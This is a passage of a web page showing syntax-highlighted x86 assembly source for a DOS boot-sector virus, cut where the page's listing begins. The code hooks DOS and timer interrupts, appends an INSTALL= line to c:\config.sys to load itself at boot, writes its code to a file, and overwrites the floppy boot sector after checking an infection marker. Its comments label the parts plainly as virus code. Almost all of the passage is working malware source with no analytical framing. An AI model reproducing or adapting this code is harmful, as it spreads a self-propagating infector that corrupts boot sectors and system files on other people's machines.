                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_it</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;save file date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc0">                  </span><span class="sc1">;create random file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_install</span><span class="sc4">+</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;write virus code into file</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">;close it</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">;date and handle c:\config.sys</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;set date</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;save it for later</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">;go to end of c:\config.sys</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;write INSTALL=\ line</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crlf</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">0a0dh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc5">crlf</span><span class="sc4">-</span><span class="sc5">install_name</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">install_name</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">                     </span><span class="sc1">;be sure to cr lf terminate it</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">;get file date</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;blitz seconds and more </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">close_it</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">;close c:\config.sys</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">set_21_back</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">previous_hook</span><span class="sc4">+</span><span class="sc2">7c00h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_int_21</span><span class="sc0">        </span><span class="sc1">;unhook it 21</span><span class="sc0">
</span><span class="sc5">retry_later</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_pop_it</span><span class="sc0">     
</span><span class="sc5">interrupt_21</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">interrupt_1a</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;hooked at boot and waits for</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;dos to load</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1200h</span><span class="sc0">                </span><span class="sc1">;dos loaded</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jmp_pop_it</span><span class="sc0">              </span><span class="sc1">;and unhook int 1a</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;if loaded then hook int 21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">              </span><span class="sc1">;sorry for all the complexity</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">previous_hook</span><span class="sc4">+</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">previous_hook</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-((</span><span class="sc2">21h</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">)+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-((</span><span class="sc2">21h</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-((</span><span class="sc2">21h</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">)+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;also save int 21 into int 18</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-((</span><span class="sc2">21h</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_21</span><span class="sc4">+</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;set int 21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">set_int_21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">jmp_pop_it</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pop_it</span><span class="sc0">
</span><span class="sc5">interrupt_1a</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">001b4h</span><span class="sc0">

</span><span class="sc5">resident_21</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;memory resident int 21</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;called when loaded from</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;config.sys</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                  </span><span class="sc1">;is it set drive</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pop_it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">;drive A:</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">pop_it</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">;set varables to read sector</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_line</span><span class="sc0">
</span><span class="sc5">next_line</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbuffer</span><span class="sc4">-</span><span class="sc5">next_line</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">                </span><span class="sc1">;try reading the boot sector</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">pop_it</span><span class="sc0">                  </span><span class="sc1">;if not don't infect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">id</span><span class="sc4">-</span><span class="sc5">top</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">7ch</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pop_it</span><span class="sc0">                  </span><span class="sc1">;check if infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">                </span><span class="sc1">;move and write boot sector</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;save for later</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;for far retf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_cx_dx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">previous_hook</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">vbuffer</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">com_install</span><span class="sc4">-</span><span class="sc5">top</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">(</span><span class="sc5">jmp_install</span><span class="sc4">-</span><span class="sc5">top</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;place initial jmp at front</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">;write it</span><span class="sc0">
</span><span class="sc5">pop_it</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">resident_21</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">001fdh</span><span class="sc0">                

</span><span class="sc5">far_jmp</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">;jmp to old int 1a or boot</span><span class="sc0">
</span><span class="sc5">previous_hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc5">double</span><span class="sc0">                  </span><span class="sc1">;up int 21 or resident int 21</span><span class="sc0">
</span><span class="sc5">far_jmp</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">boot_signature</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0aa55h</span><span class="sc0">                  </span><span class="sc1">;guess what</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">vbuffer</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">                    </span><span class="sc1">;buffer to read boot sector </span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">0202h</span><span class="sc0">                 </span><span class="sc1">;the end of the code</span><span class="sc0">
</span><span class="sc5">tail</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">qseg</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
